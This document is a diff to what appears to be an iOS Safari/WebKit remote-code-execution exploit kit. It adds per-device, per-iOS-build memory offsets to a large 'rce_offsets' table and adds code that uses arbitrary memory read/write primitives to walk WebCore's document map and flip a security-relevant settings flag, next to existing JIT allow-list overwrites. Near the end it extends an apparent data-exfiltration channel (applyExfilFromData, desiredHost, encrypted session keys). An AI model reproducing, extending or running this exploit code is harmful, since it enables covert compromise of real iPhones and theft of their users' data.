+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -8289,6 +8337,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -8396,6 +8445,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -8503,6 +8553,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -8610,6 +8661,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a560n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
@@ -8718,6 +8770,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b8c0n,
@@ -8825,6 +8878,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b8c0n,
@@ -8932,6 +8986,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b940n,
@@ -9039,6 +9094,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b940n,
@@ -9146,6 +9202,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899860n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b6c0n,
@@ -9253,6 +9310,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bd00n,
@@ -9360,6 +9418,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87be40n,
@@ -9467,6 +9526,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87be40n,
@@ -9574,6 +9634,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a1e0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c040n,
@@ -9681,6 +9742,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a1e0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c040n
@@ -9788,6 +9850,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a0a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bf00n,
@@ -9896,6 +9959,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a0a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bf00n,
@@ -10004,6 +10068,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bd00n,
@@ -10112,6 +10177,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c0c0n,
@@ -10220,6 +10286,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c0c0n,
@@ -10328,6 +10395,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880200n,
@@ -10436,6 +10504,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880200n,
@@ -10544,6 +10613,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -10652,6 +10722,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -10760,6 +10831,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -10868,6 +10940,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -10976,6 +11049,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -11084,6 +11158,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -11192,6 +11267,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -11300,6 +11376,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -11408,11 +11485,12 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a560n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
-   },
-  // === 22G163 â derived from 22G100 ===
+   }
+  // === 22G163 — derived from 22G100 ===
   "iPhone11,2_4_6_22G163": {
       __pthread_head : 0x2689b0020n,
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ed8f9da8n,
@@ -14210,7 +14288,7 @@ rce_offsets = {
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
    },
-  // === 22G156 â derived from 22G100 ===
+  // === 22G156 — derived from 22G100 ===
   "iPhone11,2_4_6_22G156": {
       __pthread_head : 0x2689b0020n,
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ed8f9da8n,
@@ -17008,7 +17086,7 @@ rce_offsets = {
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
    },
-  // === 22G150 â derived from 22G100 ===
+  // === 22G150 — derived from 22G100 ===
   "iPhone11,2_4_6_22G150": {
       __pthread_head : 0x2689b0020n,
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ed8f9da8n,
@@ -19806,7 +19884,7 @@ rce_offsets = {
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c3c0n,
    },
-  // === 22G120 â derived from 22G100 ===
+  // === 22G120 — derived from 22G100 ===
   "iPhone11,2_4_6_22G120": {
       __pthread_head : 0x2689b0020n,
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ed8f9da8n,
@@ -24028,6 +24106,33 @@ const device_chipset = {
           }
           write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
           write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
+          try {
+              const docsMap = offsets.WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents;
+              if (docsMap) {
+              const table = read64(docsMap);
+              const heapPtr = (v) => v >= 0x100000000n && v < 0x200000000n;
+              let flipped = false;
+              for (let off = 0n; off < 0x200n; off += 8n) {
+                  const impl = read64(table + off);
+                  if (!heapPtr(impl) || (impl >= table && impl < table + 0x400n)) continue;
+                  for (const wo of [0x8n, 0x10n, 0x18n]) {
+                      const doc = read64(impl + wo);
+                      if (!heapPtr(doc)) continue;
+                      const settings = read64(doc + 0x2c0n);
+                      if (!heapPtr(settings)) continue;
+                      const flagAddr = settings + 0x2can;
+                      const before = read64(flagAddr);
+                      if ((before & 0xf0n) != 0x80n && (before & 0xf0n) != 0x90n) continue;
+                      if (!(before & 0x10n)) {
+                          write64(flagAddr, before | 0x10n);
+                      }
+                      flipped = true;
+                      break;
+                  }
+                  if (flipped) break;
+              }
+              }
+          } catch (eGate) {}
           const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
           const contexts_length = read32(contexts - 4n);
           print(`contexts_lenght:${contexts_length.hex()}`);
@@ -24941,6 +25046,7 @@ async function main() {
             applyExfilFromData(data);
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
+            self.__channelCode = data.channelCode || '';
             if (data._enc_session) {
                 _enc_S = data._enc_session;
                 _enc_K = (typeof hexToBytes === 'function') ? hexToBytes(data._enc_key) : null;
